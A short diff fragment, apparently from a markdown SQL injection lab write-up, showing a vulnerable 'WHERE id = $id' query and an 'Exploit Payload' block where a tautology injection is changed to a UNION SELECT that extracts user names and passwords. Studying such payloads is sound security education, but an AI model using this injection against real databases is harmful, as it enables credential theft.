@@ -20,7 +20,7 @@ SELECT first_name, last_name FROM users WHERE id = '$id';
 ### 💣 Exploit Payload:
 
 ```
-1 OR 1=1 -- -
+1 OR 1=1 UNION SELECT user, password FROM users#
 ```
 
 ---
